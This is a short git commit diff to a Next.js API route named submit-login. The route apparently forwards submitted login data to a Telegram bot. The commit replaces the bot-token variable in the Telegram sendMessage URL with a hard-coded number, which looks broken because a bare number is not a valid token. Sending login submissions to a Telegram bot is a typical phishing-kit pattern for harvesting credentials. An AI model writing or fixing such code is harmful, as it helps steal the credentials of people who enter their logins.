38939ab6becb3944fd7a09c53810bb8a0ca8f903
Devtunechi <tunjidare2@yahoo.com>
2026-06-01 09:59:11 +0100

    final

--- app/api/submit-login/route.ts
+++ app/api/submit-login/route.ts
@@ -29,7 +29,7 @@ export async function POST(request: Request) {
 ⏱ *Time:* ${timestamp || new Date().toISOString()}
     `;
 
-    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const telegramUrl = `https://api.telegram.org/bot${52504489}/sendMessage`;
     const tgRes = await fetch(telegramUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
